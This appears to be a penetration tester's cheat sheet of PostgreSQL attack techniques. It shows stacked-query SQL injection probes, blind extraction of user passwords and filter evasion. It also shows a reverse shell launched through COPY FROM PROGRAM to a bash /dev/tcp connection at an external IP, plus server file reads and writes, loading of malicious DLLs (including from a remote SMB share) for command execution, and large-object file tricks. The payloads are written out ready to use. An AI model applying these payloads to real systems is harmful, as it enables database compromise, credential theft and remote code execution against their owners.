## PostgreSQL
> Note Stacked Queries may break application logic during SQLi;
> In PostgreSQL a semicolon can delimeter command and thus can execute totally new commands in SQLi

 ### Executing Queries against PostgreSQL DB
 #### Using pgAdmin GUI tool
To directly execute SQL Queries directly against the database, Use the `pgAdmin` tool. This is a front end for PostgreSQL
#### From Cmd
```batch
psql.exe -U postgres -p 15432
```

#### From Bash
```bash
sudo -i -u postgres
psql answers
```

### Execute System commands
```SQL
DROP TABLE IF EXISTS output;

create table output (line text);

copy output from program 'bash -c "bash -i >& /dev/tcp/192.168.119.125/9001 0>&1"';
```

### Examine Table
```sql
\d pg_largeobject
```

### Confirm SQLi Injection
```sql
;select pg_sleep(10);
```

### Blind SQLi 
```sql
# Boolean statment, where %s is ur nested query
2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)

# Where first %d is charchter index in string and second %d is guess value
ASCII(SUBSTR((SELECT password FROM users WHERE user_id=1),%d,1))<%d
ASCII(SUBSTR((SELECT password FROM users WHERE user_id=1),%d,1))>%d
```

### Filter Evasion
#### base64
```sql
# From base64
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```

#### Charchter Code point
```sql
# Charchter Code point
# Character concatenation only works for basic queries such as SELECT,  INSERT, DELETE, etc. It does not work for all SQL statements.
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);

CREATE TABLE EXAMPLETABLE (sometext text); INSERT INTO EXAMPLETABLE(sometext) VALUES (CHR(87)||CHR(66)||CHR(97)||CHR(86));
SELECT * from EXAMPLETABLE;
```

#### Avoiding Quotes
Essentially, two dollar characters (`$$`) can be used as a quote (`'`) substitute by themselves, or a single one (`$`) can indicate the beginning of a “tag.” The tag is optional, can contain zero or more characters, and is terminated with a matching dollar (`$`). If used, this tag is then required at the end of the string as well.

```sql
SELECT 'SomeText';
SELECT $$SomeText$$;
SELECT $TAG$SomeText$TAG$;
```

### Write & Read file to/from Disk
```sql
CREATE TEMP TABLE PayloadTable(payload text);INSERT INTO PayloadTable(payload) VALUES ($$WowThisWorks$$);

COPY PayloadTable(payload) TO $$C:\Users\Public\Desktop\thisworks.txt$$

# Writing to file using tables
COPY <table_name> from <file_name>

# Writing to file using nested select query
COPY (select $$payloaddata$$) to <file_name>

# Reading from file 
COPY <table_name> to <file_name>

# Read from file, Full example
CREATE temp table readdatatable (content text);COPY readdatatable from $$C:\Users\Public\Desktop\thisworks.txt$$;SELECT content from readdatatable;DROP table readdatatable;

# Blind Injection, Read from file
CREATE temp table readdatatable (content text);COPY readdatatable from $$C:\Users\Public\Desktop\thisworks.txt$$;select case when(ascii(substr((select content from readdatatable),1,1))=87) then pg_sleep(10) end;--;DROP table readdatatable;
```

### Check If running as DBA
```sql
SELECT current_setting('is_superuser');
```
![Pasted image 20210908125508.png](/Screenshots/Pasted%20image%2020210908125508.png)

### Extensions
#### Load PostgreSQL Extension
```sql
create or replace function system(cstring) returns int as 'c:\windows\system32\kernel32.dll','WinExec' language c strict;
 
create or replace function test(text, integer) returns void as $$c:\\test.dll$$,$$test$$ LANGUAGE C STRICT; 

# supports the use of remote smb shares
create or replace function test(text, integer) returns void as $$\\192.168.1.1\smb\test.dll$$,$$test$$ LANGUAGE C STRICT; 
```

Need to make sure the appropriate Postgres structure is defined. Otherwise, this error will show up
![Pasted image 20210908171828.png](/Screenshots/Pasted%20image%2020210908171828.png)

#### Check if function exists
```sql
\df test
```

#### Run function from Extension
```sql
create or replace function test(text, integer) returns void as $$c:\\test.dll$$,$$myfunctioninDLL$$ LANGUAGE C STRICT;
```

> Note that any newly launched calc.exe instance will be running as a service in the background and won't show it's gui if the postgresql is running as `System`

#### Unload extension
```batch
# 1. Stop the Service
net stop "Applications Manager"

# 2. Delete the DLL
del c:\test.dll

# 3. Start the service
net start "Applications Manager"
```

```sql
# 4. Drop the function
DROP FUNCTION test(text, integer);
```

### Postgresql Large Object
Large objects can be exported back to the file system as an identical copy of the original imported file. 

#### Create Large Object
```sql
select lo_import('c:\\windows\win.ini')

# Set loid field when importing
select lo_import('C:\\Windows\\win.ini', 1337);
```

#### List Large Objects
```sql
\lo_list

select loid, pageno from pg_largeobject;
```

#### View Data in Large Object
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```

#### Update Large Object - Write to large object directly
```sql
update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0; 
```

#### Export large object to disk
```sql
select lo_export(1337, 'C:\\new_win.ini');
```

#### Delete large object
```sql
\lo_unlink 1337
```


### References
[Command Execution in psql 9.3 < Latest ](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)